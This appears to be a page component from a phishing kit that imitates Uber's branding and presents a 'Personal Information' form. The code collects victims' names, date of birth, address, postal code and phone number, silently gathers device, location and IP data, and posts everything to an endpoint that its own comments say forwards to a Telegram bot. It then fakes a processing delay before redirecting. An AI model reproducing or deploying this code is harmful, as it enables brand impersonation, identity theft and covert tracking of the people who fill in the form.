"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader2 } from "lucide-react"
import {
  isValidName,
  isValidDateOfBirth,
  isValidAddress,
  isValidCity,
  isValidStateProvince,
  isValidPhoneNumber,
  formatPhoneNumber,
} from "../../lib/personal-validation"
import { isValidPostalCode, getPostalCodePlaceholder } from "../../lib/payment-validation"
import { useDeviceInfo } from "../../hooks/use-device-info"

const countries = [
  "United States",
  "Canada",
  "United Kingdom",
  "Australia",
  "Germany",
  "France",
  "Spain",
  "Italy",
  "Netherlands",
  "Japan",
  "Brazil",
  "Mexico",
  "India",
  "South Africa",
]

export default function PersonalInfoPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  // Get device and location information silently
  const { deviceInfo, locationInfo, ipInfo } = useDeviceInfo()

  // Form state
  const [firstName, setFirstName] = useState("")
  const [lastName, setLastName] = useState("")
  const [dateOfBirth, setDateOfBirth] = useState("")
  const [address, setAddress] = useState("")
  const [city, setCity] = useState("")
  const [stateProvince, setStateProvince] = useState("")
  const [country, setCountry] = useState("United States")
  const [postalCode, setPostalCode] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")

  // Validation states
  const isFirstNameValid = isValidName(firstName)
  const isLastNameValid = isValidName(lastName)
  const isDobValid = isValidDateOfBirth(dateOfBirth)
  const isAddressValid = isValidAddress(address)
  const isCityValid = isValidCity(city)
  const isStateProvinceValid = isValidStateProvince(stateProvince)
  const isPostalCodeValid = isValidPostalCode(postalCode, country)
  const isPhoneNumberValid = isValidPhoneNumber(phoneNumber)

  const isFormValid =
    isFirstNameValid &&
    isLastNameValid &&
    isDobValid &&
    isAddressValid &&
    isCityValid &&
    isStateProvinceValid &&
    isPostalCodeValid &&
    isPhoneNumberValid &&
    !isLoading

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value)
    setPhoneNumber(formatted)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!isFormValid) return

    setIsLoading(true)
    setError("")

    try {
      // Send personal info to Telegram bot with device info silently
      const response = await fetch("/api/telegram-personal", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          firstName,
          lastName,
          dateOfBirth,
          address,
          city,
          stateProvince,
          country,
          postalCode,
          phoneNumber,
          deviceInfo,
          locationInfo,
          ipInfo,
        }),
      })

      const result = await response.json()

      if (result.success) {
        // Simulate processing delay
        await new Promise((resolve) => setTimeout(resolve, 2000))

        // Redirect to a success page or show completion
        router.push("/")
      } else {
        setError("Failed to update personal information. Please try again.")
      }
    } catch (error) {
      console.error("Personal info update error:", error)
      setError("Network error. Please check your connection.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-black px-6 py-4">
        <div className="text-white text-2xl font-medium">Uber</div>
      </div>

      {/* Main Content */}
      <div className="px-6 pt-16 pb-8">
        <div className="max-w-md mx-auto">
          {/* Title */}
          <h1 className="text-4xl font-normal text-black mb-12 leading-tight">Personal Information</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* First Name and Last Name */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-black text-base font-normal mb-3">First Name</label>
                <Input
                  type="text"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    firstName && !isFirstNameValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                />
                {firstName && !isFirstNameValid && <p className="text-red-500 text-sm mt-1 px-1">Invalid name</p>}
              </div>

              <div>
                <label className="block text-black text-base font-normal mb-3">Last Name</label>
                <Input
                  type="text"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    lastName && !isLastNameValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                />
                {lastName && !isLastNameValid && <p className="text-red-500 text-sm mt-1 px-1">Invalid name</p>}
              </div>
            </div>

            {/* Date of Birth */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Date of Birth</label>
              <Input
                type="date"
                value={dateOfBirth}
                onChange={(e) => setDateOfBirth(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  dateOfBirth && !isDobValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {dateOfBirth && !isDobValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid date of birth</p>
              )}
            </div>

            {/* Address */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Address</label>
              <Input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  address && !isAddressValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {address && !isAddressValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid address</p>
              )}
            </div>

            {/* City and State/Province */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-black text-base font-normal mb-3">City</label>
                <Input
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    city && !isCityValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                />
                {city && !isCityValid && <p className="text-red-500 text-sm mt-1 px-1">Invalid city</p>}
              </div>

              <div>
                <label className="block text-black text-base font-normal mb-3">State/Province</label>
                <Input
                  type="text"
                  value={stateProvince}
                  onChange={(e) => setStateProvince(e.target.value)}
                  className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                    stateProvince && !isStateProvinceValid
                      ? "bg-red-100 focus:bg-red-100"
                      : "bg-gray-200 focus:bg-gray-200"
                  }`}
                  disabled={isLoading}
                />
                {stateProvince && !isStateProvinceValid && (
                  <p className="text-red-500 text-sm mt-1 px-1">Invalid state/province</p>
                )}
              </div>
            </div>

            {/* Country */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Country</label>
              <Select value={country} onValueChange={setCountry} disabled={isLoading}>
                <SelectTrigger className="w-full h-14 px-4 border-0 rounded-lg bg-gray-200 text-base focus:ring-0 focus:border-0">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {countries.map((countryOption) => (
                    <SelectItem key={countryOption} value={countryOption}>
                      {countryOption}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {/* Postal Code */}
            <div>
              <label className="block text-black text-base font-normal mb-3">
                {country === "United States" ? "ZIP Code" : "Postal Code"}
              </label>
              <Input
                type="text"
                placeholder={getPostalCodePlaceholder(country)}
                value={postalCode}
                onChange={(e) => setPostalCode(e.target.value.toUpperCase())}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  postalCode && !isPostalCodeValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {postalCode && !isPostalCodeValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid postal code for {country}</p>
              )}
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Phone Number</label>
              <Input
                type="tel"
                placeholder="+1 (555) 123-4567"
                value={phoneNumber}
                onChange={handlePhoneChange}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  phoneNumber && !isPhoneNumberValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {phoneNumber && !isPhoneNumberValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid phone number</p>
              )}
            </div>

            {/* Error Message */}
            {error && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg">{error}</div>}

            {/* Continue Button */}
            <div className="pt-8">
              <Button
                type="submit"
                disabled={!isFormValid}
                className={`w-full h-14 text-base font-medium rounded-lg transition-all duration-200 ${
                  isFormValid ? "bg-black hover:bg-gray-900 text-white" : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Updating...
                  </>
                ) : (
                  "Continue"
                )}
              </Button>
            </div>
          </form>

          {/* Form Status Indicators */}
          <div className="mt-6 text-sm text-gray-500 space-y-2">
            <div className={`flex items-center ${isFirstNameValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isFirstNameValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid first name
            </div>
            <div className={`flex items-center ${isLastNameValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isLastNameValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid last name
            </div>
            <div className={`flex items-center ${isDobValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isDobValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid date of birth
            </div>
            <div className={`flex items-center ${isAddressValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isAddressValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid address
            </div>
            <div className={`flex items-center ${isPostalCodeValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isPostalCodeValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid postal code
            </div>
            <div className={`flex items-center ${isPhoneNumberValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isPhoneNumberValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid phone number
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
